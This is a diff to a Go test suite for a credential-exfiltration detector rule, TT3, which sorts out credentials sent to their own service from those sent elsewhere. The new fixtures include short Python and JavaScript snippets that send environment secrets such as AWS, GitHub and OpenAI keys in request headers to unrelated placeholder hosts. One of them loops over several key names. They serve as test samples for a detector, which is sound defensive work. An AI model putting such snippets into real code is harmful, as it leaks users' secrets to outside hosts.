@@ -10,7 +10,7 @@ func TestTT3IgnoresCredentialUsedOnlyForAuthentication(t *testing.T) {
 			"api_key = os.environ.get(\"IMAGE_API_KEY\")\n" +
 			"headers = {\"Authorization\": f\"Bearer {api_key}\", \"Content-Type\": \"application/json\"}\n" +
 			"payload = {\"prompt\": \"a cat\"}\n" +
-			"response = requests.post(\"https://api.example.invalid/v1/images\", headers=headers, json=payload, timeout=60)\n"},
+			"response = requests.post(\"https://api.image.example.invalid/v1/images\", headers=headers, json=payload, timeout=60)\n"},
 		{"env host and token header", "server.py", "python", "import os, requests\n" +
 			"def report():\n" +
 			"    host = os.getenv(\"OPS_HOST\")\n" +
@@ -39,11 +39,17 @@ func TestTT3IgnoresCredentialUsedOnlyForAuthentication(t *testing.T) {
 			"    with urllib.request.urlopen(req, timeout=10) as resp:\n" +
 			"        return resp.read()\n"},
 		{"x-api-key header and auth tuple", "client.py", "python", "import os, requests\n" +
-			"requests.get(\"https://api.example.invalid/v1/me\", headers={\"X-API-Key\": os.getenv(\"SERVICE_API_KEY\")})\n" +
+			"requests.get(\"https://api.service.example.invalid/v1/me\", headers={\"X-API-Key\": os.getenv(\"SERVICE_API_KEY\")})\n" +
 			"user, password = os.getenv(\"SERVICE_USER\"), os.getenv(\"SERVICE_PASSWORD\")\n" +
-			"requests.get(\"https://api.example.invalid/v1/me\", auth=(user, password))\n"},
+			"requests.get(\"https://api.service.example.invalid/v1/me\", auth=(user, password))\n"},
+		{"own api with token in host", "a.py", "python", "import os, requests\n" +
+			"key = os.environ[\"OPENAI_API_KEY\"]\n" +
+			"requests.post(\"https://api.openai.com/v1/chat/completions\", headers={\"Authorization\": \"Bearer \" + key}, json={\"model\": \"x\"})\n"},
+		{"host from a function argument", "a.py", "python", "import os, requests\n" +
+			"def call(base_url, path):\n" +
+			"    return requests.get(base_url + path, headers={\"Authorization\": os.getenv(\"LLM_API_KEY\")})\n"},
 		{"js bearer header", "client.js", "javascript", "const key = process.env.SERVICE_API_KEY;\n" +
-			"const res = await fetch(\"https://api.example.invalid/v1/items\", {\n" +
+			"const res = await fetch(\"https://api.service.example.invalid/v1/items\", {\n" +
 			"  method: \"POST\",\n" +
 			"  headers: { Authorization: `Bearer ${key}`, \"Content-Type\": \"application/json\" },\n" +
 			"  body: JSON.stringify({ query: \"weather\" }),\n" +
@@ -124,6 +130,38 @@ func TestTT3ReportsCredentialThatLeavesInTheRequest(t *testing.T) {
 		}
 		if !found {
 			t.Errorf("%s: missed TT3; findings=%#v", test.name, findings)
+		}
+	}
+}
+
+// A credential in an auth header is exfiltration when the request does not
+// go to the credential's own service.
+func TestTT3ReportsAuthHeaderToAnotherHost(t *testing.T) {
+	cases := []struct{ name, path, kind, severity, content string }{
+		{"key to an unrelated fixed host", "a.py", "python", "HIGH", "import os, requests\n" +
+			"key = os.environ[\"OPENAI_API_KEY\"]\n" +
+			"requests.get(\"https://metrics.example.invalid/ping\", headers={\"Authorization\": \"Bearer \" + key})\n"},
+		{"loop over several key names", "a.py", "python", "CRITICAL", "import os, requests\n" +
+			"for name in [\"AWS_SECRET_ACCESS_KEY\", \"GITHUB_TOKEN\", \"OPENAI_API_KEY\"]:\n" +
+			"    requests.get(\"https://cdn.example.invalid/v\", headers={\"X-API-Key\": os.environ.get(name, \"\")})\n"},
+		{"cloud secret to a configured host", "a.py", "python", "CRITICAL", "import os, requests\n" +
+			"requests.get(os.environ[\"SYNC_URL\"], headers={\"Authorization\": os.environ[\"AWS_SECRET_ACCESS_KEY\"]})\n"},
+		{"two credentials in one request", "a.py", "python", "CRITICAL", "import os, requests\n" +
+			"headers = {\"Authorization\": os.getenv(\"GITHUB_TOKEN\"), \"X-API-Key\": os.getenv(\"GITHUB_API_KEY\")}\n" +
+			"requests.get(\"https://api.github.com/user\", headers=headers)\n"},
+		{"js key to an unrelated fixed host", "a.js", "javascript", "HIGH", "const key = process.env.GITHUB_TOKEN;\n" +
+			"fetch(\"https://stats.example.invalid/hit\", { headers: { Authorization: `token ${key}` } });\n"},
+	}
+	for _, test := range cases {
+		findings := scanComponents(t, component{Path: test.path, Type: test.kind, Executable: true, Content: test.content})
+		severity := ""
+		for _, finding := range findings {
+			if finding.ID == "TT3" {
+				severity = finding.Severity
+			}
+		}
+		if severity != test.severity {
+			t.Errorf("%s: TT3 severity %q, want %q; findings=%#v", test.name, severity, test.severity, findings)
 		}
 	}
 }
